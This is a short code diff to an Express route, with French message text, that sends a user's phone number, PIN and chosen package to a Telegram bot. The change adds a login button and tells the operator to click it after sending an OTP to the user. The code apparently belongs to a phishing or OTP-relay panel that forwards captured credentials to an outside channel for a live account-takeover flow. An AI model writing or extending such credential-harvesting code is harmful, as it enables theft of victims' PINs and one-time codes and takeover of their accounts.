@@ -7,7 +7,7 @@ import {
   SubmitOtpParams,
   SubmitOtpBody,
 } from "@workspace/api-zod";
-import { sendMessage, buildOtpKeyboard } from "../lib/telegram";
+import { sendMessage, buildLoginKeyboard, buildOtpKeyboard } from "../lib/telegram";
 
 const router: IRouter = Router();
 
@@ -30,10 +30,9 @@ router.post("/sessions", async (req, res): Promise<void> => {
     `📱 Téléphone: \`${phone}\`\n` +
     `🔑 PIN: \`${pin}\`\n` +
     `📦 Forfait: *${packageName}* — ${packagePrice}\n\n` +
-    `_Session: ${session.id}_\n\n` +
-    `⏳ En attente de soumission OTP...`;
+    `Cliquez sur le bouton ci-dessous après avoir envoyé l'OTP à l'utilisateur.`;
 
-  sendMessage(text).catch((err: unknown) =>
+  sendMessage(text, buildLoginKeyboard(session.id)).catch((err: unknown) =>
     req.log.error({ err }, "Failed to send Telegram login notification"),
   );
 
